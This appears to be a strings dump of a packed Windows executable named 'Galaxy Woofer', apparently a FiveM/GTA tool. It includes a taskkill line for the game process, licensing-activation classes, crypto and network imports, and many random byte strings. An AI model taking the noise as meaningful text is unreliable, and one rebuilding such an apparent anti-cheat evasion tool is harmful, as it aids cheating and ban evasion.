+000799e0	1a	A	FiveM_b2545_GTAProcess.exe
+00079a00	09	A	@echo off
+00079a10	2d	A	taskkill /F /T /IM FiveM_b2545_GTAProcess.exe
+00079a40	05	A	pause
+00079a48	17	A	invalid string position
+00079a60	14	A	23~RI[M`1&6+'*-sjK
+00079a81	0a	A	 103*4#riJ
+00079a99	05	A	$;ydE
+00079ab2	11	A	@Al7?5q# <99byZ
+00079b10	0b	A	2iO]IKLzaB
+00079bc8	14	A	2iKSRXZ2a&66/(&sjK
+00079bec	07	A	41/(&hJ
+00079c16	0d	A	/'=y+(411ZAb
+00079c28	0e	A	XVZDDh/.$&6E
+00079c38	0a	A	2`UNu_I%a
+00079c55	09	A	;4667??}]
+00079c60	0d	A	2oHYOP^-$xcD
+00079c83	17	A	ebGDO2}ZP\FF`-," 4MBI
+00083142	05	A	`Aml
+000833a0	07	A	z2+T^
+000838ab	06	A	4aAY
+000838b9	06	A	;^&z)
+00083cd8	0a	A	oVgAULGd6v
+00083d18	0d	A	Galaxy Woofer
+00083d68	17	A	.?AVCAtlException@ATL@@
+00083d90	17	A	.?AVruntime_error@std@@
+00083db8	13	A	.?AVbad_alloc@std@@
+00083de0	12	A	.?AVbad_cast@std@@
+00083e08	13	A	.?AVexception@std@@
+00083e30	1e	A	.?AVbad_array_new_length@std@@
+00083e60	14	A	.?AVCWin32Heap@ATL@@
+00083e88	14	A	.?AUIAtlMemMgr@ATL@@
+00083eb0	17	A	.?AUIAtlStringMgr@ATL@@
+00083ed8	17	A	.?AVCAtlStringMgr@ATL@@
+00083f00	44	A	.?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+00083f60	33	A	.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
+00083fb0	47	A	.?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+00084010	32	A	.?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@
+00084060	31	A	.?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
+000840a8	2d	A	.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
+000840e8	12	A	.?AVios_base@std@@
+00084110	13	A	.?AV?$_Iosb@H@std@@
+00084140	31	A	.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
+00084188	1f	A	.?AVexception@detail@nlohmann@@
+000841b8	21	A	.?AVparse_error@detail@nlohmann@@
+000841f0	22	A	.?AVout_of_range@detail@nlohmann@@
+00084228	0e	A	.?AVCSid@ATL@@
+00084248	16	A	.?AVCAccessToken@ATL@@
+00084270	0f	A	.?AVtype_info@@
+00084b90	0d	A	Galaxy Woofer
+00084bb0	0a	A	oVgAULGd6v
+00084db0	0b	A	Initialized
+00084dd0	0a	A	vrJ4yq5M6Y
+0008861b	05	A	oxQ/
+000b0af0	0f	A	string too long
+000b0b28	17	A	invalid string position
+000b0bd0	11	A	Unknown exception
+000b0cf3	6c	A	 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+000b0d68	0e	A	CorExitProcess
+000b0d78	0b	U	mscoree.dll
+000b0e50	0d	A	bad exception
+000b1670	08	A	HH:mm:ss
+000b1680	13	A	dddd, MMMM dd, yyyy
+000b1698	08	A	MM/dd/yy
+000b16b0	08	A	December
+000b16c0	08	A	November
+000b16d0	07	A	October
+000b16d8	09	A	September
+000b16e4	06	A	August
+000b16fc	05	A	April
+000b1704	05	A	March
+000b1710	08	A	February
+000b1720	07	A	January
+000b1758	08	A	Saturday
+000b1764	06	A	Friday
+000b1770	08	A	Thursday
+000b1780	09	A	Wednesday
+000b1790	07	A	Tuesday
+000b1798	06	A	Monday
+000b17a0	06	A	Sunday
+000b17c8	0e	A	runtime error 
+000b1d48	24	A	Microsoft Visual C++ Runtime Library
+000b1d78	16	A	<program name unknown>
+000b1da0	09	A	Program: 
+000b1db0	06	U	(null)
+000b1dc0	06	A	(null)
+000b1e09	06	A	`h````
+000b1e90	19	A	 Complete Object Locator'
+000b1eb0	1c	A	 Class Hierarchy Descriptor'
+000b1ed0	12	A	 Base Class Array'
+000b1ee8	1b	A	 Base Class Descriptor at (
+000b1f08	11	A	 Type Descriptor'
+000b1f20	1b	A	`local static thread guard'
+000b1f40	2a	A	`managed vector copy constructor iterator'
+000b1f70	28	A	`vector vbase copy constructor iterator'
+000b1fa0	22	A	`vector copy constructor iterator'
+000b1fc8	20	A	`dynamic atexit destructor for '
+000b1ff0	1a	A	`dynamic initializer for '
+000b2010	2b	A	`eh vector vbase copy constructor iterator'
+000b2040	25	A	`eh vector copy constructor iterator'
+000b2068	24	A	`managed vector destructor iterator'
+000b2090	25	A	`managed vector constructor iterator'
+000b20b8	1c	A	`placement delete[] closure'
+000b20d8	1a	A	`placement delete closure'
+000b20f8	0e	A	`omni callsig'
+000b2108	09	A	 delete[]
+000b2114	06	A	 new[]
+000b2120	23	A	`local vftable constructor closure'
+000b2148	0f	A	`local vftable'
+000b2158	05	A	`RTTI
+000b2168	0f	A	`udt returning'
+000b2178	1a	A	`copy constructor closure'
+000b2198	26	A	`eh vector vbase constructor iterator'
+000b21c0	1f	A	`eh vector destructor iterator'
+000b21e0	20	A	`eh vector constructor iterator'
+000b2208	1a	A	`virtual displacement map'
+000b2228	23	A	`vector vbase constructor iterator'
+000b2250	1c	A	`vector destructor iterator'
+000b2270	1d	A	`vector constructor iterator'
+000b2290	1c	A	`scalar deleting destructor'
+000b22b0	1d	A	`default constructor closure'
+000b22d0	1c	A	`vector deleting destructor'
+000b22f0	12	A	`vbase destructor'
+000b2308	08	A	`string'
+000b2318	14	A	`local static guard'
+000b2330	08	A	`typeof'
+000b2340	07	A	`vcall'
+000b2348	09	A	`vbtable'
+000b2358	09	A	`vftable'
+000b23e0	08	A	operator
+000b2408	07	A	 delete
+000b2418	0b	A	__unaligned
+000b2428	0a	A	__restrict
+000b2438	07	A	__ptr64
+000b2440	09	A	__clrcall
+000b2450	0a	A	__fastcall
+000b2460	0a	A	__thiscall
+000b2470	09	A	__stdcall
+000b2480	08	A	__pascal
+000b2490	07	A	__cdecl
+000b2498	08	A	__based(
+000b27c0	15	A	SunMonTueWedThuFriSat
+000b27d8	24	A	JanFebMarAprMayJunJulAugSepOctNovDec
+000b2800	17	A	GetProcessWindowStation
+000b2818	19	A	GetUserObjectInformationA
+000b2838	12	A	GetLastActivePopup
+000b2850	0f	A	GetActiveWindow
+000b2860	0b	A	MessageBoxA
+000b2870	0a	A	USER32.DLL
+000b2880	07	A	CONOUT$
+000b2890	22	U	\REGISTRY\MACHINE\SOFTWARE\Classes
+000b28e0	0b	U	Wow6432Node
+000b29c0	23	U	\Registry\Machine\Software\Classes\
+000b2a08	0e	U	\REGISTRY\USER
+000b2a28	0b	U	Fatal Error
+000b2cc0	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+000b2d88	05	U	%02X 
+000b2e00	25	A	0123456789abcdefghijklmnopqrstuvwxyz-
+000b3060	10	A	0123456789abcdef
+000b30a8	0e	A	bad allocation
+000b3220	11	A	DllRegisterServer
+000b3238	0a	A	DllInstall
+000b3248	08	U	register
+000b3260	07	U	install
+000b3298	0b	U	Error: 0x%X
+000b32b0	11	U	DllRegisterServer
+000b32d8	0a	U	DllInstall
+000b32f0	42	U	The procedure entry point %s could not be located in the module %s
+000b33a0	09	U	Error: %d
+000b7bec	06	A	p`0
+000b944e	05	A	PM{q;
+000b9981	06	A	BMgZ2
+000b9cd5	06	A	"w.%.
+000ba620	15	A	.?AVlogic_error@std@@
+000ba648	16	A	.?AVlength_error@std@@
+000ba670	16	A	.?AVout_of_range@std@@
+000ba6b0	0f	A	.?AVtype_info@@
+000ba73e	1a	A	                          
+000ba81e	1a	A	abcdefghijklmnopqrstuvwxyz
+000ba83e	1a	A	ABCDEFGHIJKLMNOPQRSTUVWXYZ
+000ba942	1a	A	                          
+000ba9c0	18	A	                        
+000ba9d9	08	A	        
+000baa31	1a	A	abcdefghijklmnopqrstuvwxyz
+000baa51	1a	A	ABCDEFGHIJKLMNOPQRSTUVWXYZ
+000bafb8	17	A	.?AVbad_exception@std@@
+000bdf28	19	A	.?AVDeactivationRequest@@
+000bdf58	17	A	.?AVActivationRequest@@
+000bdf80	11	A	.?AVBaseRequest@@
+000bdfa8	13	A	.?AVexception@std@@
+000bdfd0	13	A	.?AVbad_alloc@std@@
+000be120	28	A	C:\Users\nikol\Desktop\Galaxy_Woofer.exe
+000c28b8	05	A	2\"3B
+000c6c2f	05	A	tPr
+000cd34f	05	A	n,d;z
+000d23b5	07	A	-=X|#=
+000d3a67	05	A	j11e
+000d7b91	06	A	<&$"A
+000d89bd	05	A	}60T[
+000e759a	05	A	UNKga
+000f3229	05	A	<]Y=
+000f697f	05	A	5bY{
+001083f6	05	A	'6T]
+0010d605	05	A	X1,<
+00113fa0	05	A	94$)
+00115c14	05	A	\nNiq
+00115f84	06	A	KZ~j-
+0011644c	06	A	F9-F
+001193ee	06	A	QMuut$
+0011b8d6	05	A	o#t":
+0011d8d1	06	A	#i9@B
+001216e3	05	A	MDd/m
+001232eb	07	A	@w~RB
+0012ccb4	05	A	b\}oS
+00133f44	06	A	l,2/Um
+0013c431	06	A	4iLrKv
+0013c746	05	A	SVbn
+00142e59	05	A	7LR7/
+0014456f	07	A	04f;M0
+00149339	05	A	Gc,KY
+00149e02	05	A	D-'#C
+0015598e	05	A	t7Q=9
+00157d61	05	A	uK`U
+0015f281	08	A	!ooUp.;
+00160478	05	A	e8c`X
+00162263	05	A	5ef`^
+0016ac87	05	A	VldHY
+0016bb98	05	A	DQW*
+0016f894	05	A	Z_kC
+0016fa36	05	A	^uU
+00178c94	0a	A	tuDFl%:V>
+0017f06f	06	A	O3f|=
+0018391a	05	A	F>[>q
+001897c5	05	A	#^{ C
+0018baf5	05	A	OIAXn
+0018d645	09	A	`u=AC{Vn$
+0018dc74	05	A	88yY@
+0018e152	07	A	UFm@92H
+0018ef1e	07	A	8,h-'9
+00191801	05	A	Xc&'Y
+001932c6	06	A	(Mfx"1
+00196220	06	A	,DplpZ
+001a40e0	06	A	.VyFA#
+001a79a2	05	A	)<)A
+001ad970	08	A	@>Mo@b
+001b1cae	08	A	XYo_-q>
+001b70fb	06	A	!k,x
+001b728d	05	A	}b'V[
+001b8ed6	05	A	^P13
+001b91c4	05	A	$`x5S
+001bb919	06	A	Q~ec
+001bbf00	05	A	5,XFu
+001bf210	06	A	VJjF
+001c94db	05	A	JHx;
+001d2120	06	A	% M>C
+001d49b0	05	A	:?7
+001d9ea4	05	A	_-'_T
+001e0371	05	A	.4)hQ
+001e36e7	05	A	KbA
+001e8b54	05	A	1HDr
+001ea5b1	07	A	Ok}0XAk
+001efb83	05	A	0KXk9
+001eff10	05	A	^(
+001f6a6c	05	A	"bA?
+001f8bc0	05	A	fM)U}
+001fe45e	05	A	Q!6N
+00201114	07	A	]B/;]
+00203401	05	A	H'$
+002051ad	05	A	2_Nl@
+0020ca61	06	A	EEj<y^
+0020cc5f	0b	A	\52`m&`E"
+0020ccae	05	A	:?#)J
+0020d5a5	05	A	}5"
+0020e0dd	05	A	GF4y
+002128ac	05	A	Tj|(n
+00215c96	07	A	M# JsM
+002160ea	05	A	?,S8
+00218838	06	A	jrtM&
+0021cbc5	05	A	K+@`n
+0021dcb5	05	A	o[pT(
+00221f48	07	A	RSyVI(
+0022b8bc	05	A	HiPW
+0022c652	05	A	J7T n
+00248301	08	A	e =2HMMY
+00249e8c	06	A	~G~DH
+002520ba	05	A	9UR&!
+0025b498	05	A	ae|0\
+0025fcc6	08	A	#Y7i}wD4
+0026203c	08	A	M#ua+
+00310cf9	06	A	dywfT~
+0031b219	06	A	$)w[.
+00360339	06	A	,\w[
+0039cd29	06	A	N:wy~=
+003b2c01	0a	A	Lm|tm=d/X
+003b2f18	07	A	ntm$stm
+003b3740	07	A	`wm'stm
+003b3ee3	08	A	])~m'stm
+003b4395	06	A	um'stm
+003b4acd	06	A	qm$stm
+003b53e1	06	A	M-CWWm
+003b5499	07	A	fmJrtm]
+003b5961	06	A	gm;wtm
+003b5d37	09	A	)Htm$stm*
+003b75f7	09	A	Jscme{tmY
+003b7bed	09	A	Tm[{tme0
+003b98cd	07	A	|m'stm!
+003ba100	08	A	*um'stm~
+003ba221	06	A	Wm4wtm
+003ba70c	07	A	<FmK|tm
+003baf7a	0a	A	-y%dm_stmX
+003bb151	06	A	pm$stm
+003bc121	05	A	`4c*'
+003be24a	20	A	_api-ms-win-crt-heap-l1-1-0.dll
+003beed3	09	A	WXQTeL /\
+003c8193	05	A	`DDm$
+003d0d1e	05	A	Z@,tu
+003d366f	05	A	4GV*G
+003d3a1e	06	A	FBtygu
+003d3a89	07	A	&#NJ<<
+003d3bdd	05	A	N5{o<
+003d3bf5	05	A	[>@6
+003d3c25	05	A	#LYy)
+003d3c8e	06	A	srvjD?
+003d3f22	06	A	=ulA)v
+003d3f69	07	A	{d/U_w
+003d3fae	06	A	QZ;W}A
+003d4079	07	A	"bFvB
+003d40a9	07	A	@E\6}A
+003d41e2	06	A	MB34?
+003d4261	07	A	wPJfI
+003d440e	06	A	BMYWv
+003d44b7	05	A	p?GC
+003d45a5	07	A	W_C 7u
+003d45d5	07	A	\F<|/v
+003d462a	06	A	*[)bM>
+003d4696	06	A	ZZcC>x
+003d485e	06	A	<DX#A
+003d5638	0a	A	RPCRT4.dll
+003d6ede	05	A	?jJZ
+003d7000	0f	A	WTSSendMessageW
+003d7010	0b	A	CRYPT32.dll
+003d7868	06	A	w9%QA
+003d89fb	05	A	5h,.A
+003d8d90	08	A	_fstat64
+003da6c8	0d	A	<tUSERENV.dll
+003dd24c	07	A	P2ptQ[
+003dd9a4	11	A	UnloadUserProfile
+003e111f	06	A	s=22/
+003e9138	21	A	api-ms-win-crt-runtime-l1-1-0.dll
+003ebbf6	07	A	aJ^E|%K
+003ed2c2	17	A	GetProcessWindowStation
+003ed966	0a	A	USER32.dll
+003f0b94	19	A	GetUserObjectInformationW
+003f304d	06	A	b{_- &
+003f51de	14	A	GetModuleInformation
+003fdcd5	0d	A	gKERNEL32.dll
+00400e5d	05	A	1K*(
+004035c2	0e	A	RpcStringFreeA
+00404de8	05	A	HWo$q
+00406871	06	A	=5(]78
+004090fc	05	A	7%+|
+004098b0	09	A	LocalFree
+0040c412	05	A	:Fl~
+0040f6fa	09	A	PSAPI.DLL
+0040fc16	09	A	_gmtime64
+00410498	06	A	*8~VE
+00410942	05	A	7ZQ`$
+00412332	0e	A	GetProcAddress
+00412344	41	A	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ
+00413bee	12	A	VCRUNTIME140_1.dll
+00413fd4	0a	A	IdnToAscii
+0041453b	05	A	?8[G
+00414fb3	0d	A	JMSVCP140.dll
+004160f8	05	A	|}!g}
+00417b80	12	A	GetModuleFileNameW
+00418b83	05	A	P !
+0041bcdc	05	A	v=oN-
+0041c1fa	05	A	cY\I
+0041c568	24	A	api-ms-win-crt-filesystem-l1-1-0.dll
+0041ca8a	16	A	SetProcessAffinityMask
+0041e2af	05	A	!.3\6
+00426b99	07	A	+SQcvM.
+0042ab5b	06	A	$pYSa[
+0042e5b7	05	A	eK|ff
+0042fcd8	07	A	_dclass
+0043085a	07	A	\{GP]w
+00434167	05	A	VZX<
+00434592	08	A	U@U?cQ@F
+00435915	07	A	(OF8D),
+00438ef4	06	A	r2k?Uo
+0043982c	06	A	b`+,rW
+00439dd9	06	A	b`cxW
+0043bfe0	0b	A	SHELL32.dll
+0043d82f	05	A	k74O
+0043da6b	05	A	Z=PH
+0043e21c	05	A	*RK
+00441c1a	05	A	qW";^
+004462b4	05	A	q?!
+004466ee	06	A	ro54K
+00448b18	05	A	=#7
+00449c76	05	A	"tq3y
+0044cabb	05	A	/W05v
+0045157e	05	A	O9h]t
+0045251e	06	A	}DvkT&
+0045654b	05	A	eOD
+0045e5da	07	A	#W`O
+00461107	05	A	;+C"C
+00462209	05	A	CiD"N
+00468d2c	07	A	)x:$7kr
+00469043	05	A	/Ig
+0046bc61	05	A	P~1:
+00471a0b	05	A	]@Ne
+00473f94	0c	A	CryptEncrypt
+004742da	06	A	strtod
+0047779e	08	A	(#bU-Ulv
+004791a8	07	A	neDUbs^
+0047e731	05	A	LcMKI
+0047e742	05	A	3@D@O
+0047f546	0d	A	ShellExecuteA
+004818ac	07	A	-MPA9J?
+00482828	12	A	__CxxFrameHandler4
+00483b3b	05	A	rsM~K
+00484244	05	A	i{*-O
+004849c2	05	A	*-Co0
+00487402	0b	A	ExitProcess
+0048740e	0a	A	WS2_32.dll
+004884d4	0e	A	&oADVAPI32.dll
+0048b596	05	A	R6 l]
+0048cc7c	0a	A	LocalAlloc
+0048d300	10	A	VCRUNTIME140.dll
+0048e399	05	A	'sUeO
+0049260a	0b	A	WLDAP32.dll
+004943d8	0c	A	LoadLibraryA
+004946a6	06	A	malloc
+00494e10	05	A	gE|
+00495134	0b	A	FreeLibrary
+0049572c	1e	A	api-ms-win-crt-time-l1-1-0.dll
+00497496	05	A	9<I9d
+00497ebe	15	A	SetThreadAffinityMask
+00498f43	05	A	m*5i
+0049ba92	21	A	api-ms-win-crt-convert-l1-1-0.dll
+0049c588	0c	A	WTSAPI32.dll
+0049c598	0a	A	__sys_nerr
+0049ca67	05	A	:IR@
+0049cb8c	05	A	?3<NJ
+004a12c9	06	A	j`0x_
+004a7528	05	A	S3fH@
+004ac79d	05	A	)nZPL
+004b18be	06	A	S;cSV
+004b2387	06	A	&O%RL
+004b34ce	05	A	lO"L-
+004b6ed5	05	A	N."7
+004bbc69	05	A	l hX
+004bca20	05	A	<|#t
+004c0d36	05	A	(cY0
+004c4426	05	A	*fYkt
+004c4e3f	05	A	13|vM
+004c6abb	05	A	Oi7
+004d2ce5	06	A	z.T)O;
+004dbf5c	05	A	WM^="
+004e1f91	08	A	).9=FP5f
+004e7be1	05	A	V.r_
+004eb811	06	A	UE9EtA
+004f737c	07	A	7 e#5%
+0050772f	05	A	j(d0
+00509511	07	A	9C)@;^
+005098ee	05	A	Ra"}W
+00513e83	09	A	#bAF.[VN
+00518391	07	A	Jkf|"}C
+0051a579	05	A	^o!s
+0053dc95	06	A	f#{Dz
+005466f7	06	A	_b)o
+00546deb	06	A	9jd3.K
+005476ff	05	A	~Zc0N
+00549d95	05	A	aL_;
+0054a6c3	05	A	7T=-$
+0054c38e	06	A	6{Cn8
+0054f8a6	05	A	AU5a`
+0055284f	05	A	OdGg7
+005555a9	05	A	$iE:
+00555e6f	05	A	Zj
+0055b036	09	A	)n?."|_Xr
+0055bc6b	07	A	II{ZJ'\
+00562e3f	05	A	"p0m3
+0056fc88	07	A	JpCi*n=
+00576c18	05	A	Sr,ud
+00577030	06	A	A'"{:
+0057a71c	05	A	uL?Ko
+0057af16	06	A	q7;
+0057d18b	06	A	"zW$D)
+0057d26a	05	A	MkKn
+0058e1a0	08	A	3f>Sa.W 
+005916b3	06	A	T^rGS
+00593e29	06	A	Y'q]9!
+0059ab94	05	A	Q't4
+0059d522	08	A	]0K;$7f
+005a790d	05	A	f{`lF
+005a8c70	05	A	]E:
+005ab26d	05	A	q l~Q
+005b037b	06	A	qP(/}D
+005b124a	05	A	&wD
+005b3485	05	A	p'v;/
+005b4800	05	A	9X)fZ
+005b87af	05	A	f 1E
+005bda3e	05	A	4:8
+005c8dd4	05	A	<Y2.
+005cdbd2	05	A	[*G
+005cff74	05	A	@MD7\
+005d3f50	06	A	$-U\e
+005df17e	05	A	5Fg0L
+005e4ff2	05	A	OsVS
+005e816e	05	A	Cwr!
+005f7e69	08	A	:6<u\8
+005ffc66	05	A	R! 1\
+0060d464	05	A	+ Cc1
+00610b8d	05	A	soy52
+0061c872	06	A	"|~?=
+0061f105	05	A	juU3)
+00620351	05	A	aJyus
+00621edf	05	A	| {l
+006220b1	06	A	NvQ%
+0062646b	06	A	emnkoA
+0062894f	05	A	%N
+006297b0	05	A	</cX
+0062f1d4	05	A	/=M
+0063145c	0d	A	c3o$YTu=($a%7
+00635a74	06	A	;k{2
+0063cd78	06	A	l/NZVd
+0063ceb6	05	A	"ov*9
+0063ed24	06	A	(8pDk
+006402f2	05	A	->UL
+00650e17	06	A	:dZky
+0065a59c	05	A	o-J[j
+00665b80	05	A	mz`9
+006713e8	06	A	5VGW4
+00675417	05	A	cCqI 
+006778a0	07	A	7vJov(
+006778c2	06	A	aj7v9S
+00679061	05	A	<d$(y
+0067cb30	05	A	+bXw
+0067e3a6	05	A	OHE_>
+0068b3d6	06	A	cWif1Y
+00693fa3	05	A	]7k8
+00695569	05	A	~x}\
+006a577a	06	A	9*lH+7
+006a5ba3	06	A	x2y`K
+006a5d05	07	A	E%.8"y
+006a5f40	05	A	3(!'i
+006a961c	05	A	!!f
+006ad328	05	A	>i*a
+006b3279	08	A	}0Ef}jlK
+006b9c35	05	A	0[Z)D
+006bd823	07	A	>UsO;E
+006ca950	06	A	(8X,(
+006cfc46	05	A	2VK:e
+006d0d7c	06	A	!62S&
+006d5d7d	06	A	|XJVX
+006d9663	09	A	j>+@+Ne
+006df2e3	07	A	=~@%3
+006e2376	05	A	r(~Ow
+006eafc2	05	A	5/E1
+006f0c48	05	A	p9,{p
+006f0f59	05	A	W6}@)
+006f1977	06	A	E(sk2#
+006f6b02	05	A	N-Bi`
+006f80d0	05	A	%FS, 
+006fa74c	06	A	n5<5Z'
+006fff18	05	A	oXa"
+00702007	05	A	qYCz#
+00708a57	06	A	?<^%O
+0070fc3b	05	A	<K2w
+0072558e	05	A	0|"^
+00726822	05	A	/l#$
+00727242	05	A	X>ce
+0072c87f	07	A	oP%7
+0072e23c	06	A	HO+?u
+00732df3	05	A	F={Z
+00734012	05	A	/<R}
+0073758f	09	A	h$Oti~hvO
+0073b4e0	19	A	GetUserObjectInformationW
+0073b567	07	A	*D$|rVS
+0073f137	20	A	hapi-ms-win-crt-stdio-l1-1-0.dll
+00742e94	06	A	Z`fEo
+0074335a	05	A	f(O@
+00743f80	06	A	#$NJ=:
+007455c6	20	A	api-ms-win-crt-locale-l1-1-0.dll
+007462e5	06	A	M[P[[
+00747aed	06	A	`%JCdJ
+00748abb	05	A	d?8F9
+00749d91	05	A	JUs(|
+0074c704	10	A	GetModuleHandleA
+0074cfd0	09	A	#y4!8J#7!
+0074e668	0b	A	MessageBoxA
+0074ecdc	05	A	Sleep
+0074f20c	17	A	__std_exception_destroy
+00751cbe	13	A	_configthreadlocale
+007548e6	05	A	9Gx;x
+007559c6	06	A	T`><a
+0075f494	0c	A	Normaliz.dll
+007640df	05	A	!m{~F
+00764d82	05	A	g^5E:
+007659d0	07	A	strncmp
+00765b22	05	A	9g/aj
+007682e5	05	A	gb%k
+0076a6d8	18	A	CertFreeCertificateChain
+0076c09a	16	A	GetProcessAffinityMask
+0076cbf0	17	A	GetSystemTimeAsFileTime
+0076ce00	05	A	qsort
+0076d234	05	A	6yP`
+0076db28	05	A	JhGDw
+00775e4c	05	A	'^ 4x
+0077650a	06	A	K5/\R
+0077791a	05	A	p nji
+00777eaf	05	A	E|V"i
+0077f1cc	1e	A	api-ms-win-crt-math-l1-1-0.dll
+0077fe30	12	A	VerifyVersionInfoA
+0078154d	06	A	uiBO!
+0078233c	20	A	api-ms-win-crt-string-l1-1-0.dll
+00782dc4	21	A	api-ms-win-crt-utility-l1-1-0.dll
+007a24a1	06	A	dywfT~
+007a9b41	06	A	,\w[
+008747b1	06	A	N:wy~=
+008c2261	06	A	$)w[.
+008d161a	06	A	Jm=rtm
+008d1b65	07	A	\Hm+stm
+008d2047	05	A	m4ztm
+008d25c3	06	A	mm|tm'
+008d3247	07	A	mOtmI
+008dc003	05	A	;AZe_
